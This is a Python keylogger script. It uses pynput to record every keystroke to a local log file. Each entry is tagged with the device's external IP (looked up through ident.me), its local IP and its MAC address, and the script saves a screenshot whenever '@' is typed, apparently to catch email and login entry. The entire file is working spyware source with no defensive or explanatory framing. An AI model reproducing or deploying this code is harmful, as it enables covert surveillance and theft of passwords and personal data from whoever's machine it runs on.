from pynput.keyboard import Key, Listener
import logging
import urllib.request
import threading
import socket
from getmac import get_mac_address as gma
import pyautogui
import os
# external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')


deviceip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

counter = 0


def setup_logger(name, log_file, level=logging.INFO):
    open(log_file, 'w').close()
    """To setup as many loggers as you want"""

    formatter = logging.Formatter("%(asctime)s;%(levelname)s;%(message)s",
                              "%Y-%m-%d %H:%M:%S")
    # formatter = logging.Formatter(" %(asctime)s - %(message)s")

    handler = logging.FileHandler(log_file)        
    handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger


# logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

speciallogger = setup_logger('specialcharacterlogger', 'special.txt')

keylogger = setup_logger('keyloggerallstrokes', 'keylog.txt')

cwd = os.getcwd()

def on_press(key):


    global counter 

    if(key == Key.esc):
        quit()

    print(str(key))
    if(str(key) == "'@'"):
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r"{0}\screenshot{1}.png".format(cwd, counter))

        counter+=1

        # speciallogger.info(str(key))

    keylogger.info(deviceip+";"+socket.gethostbyname(socket.gethostname())+";"+gma()+";"+str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()

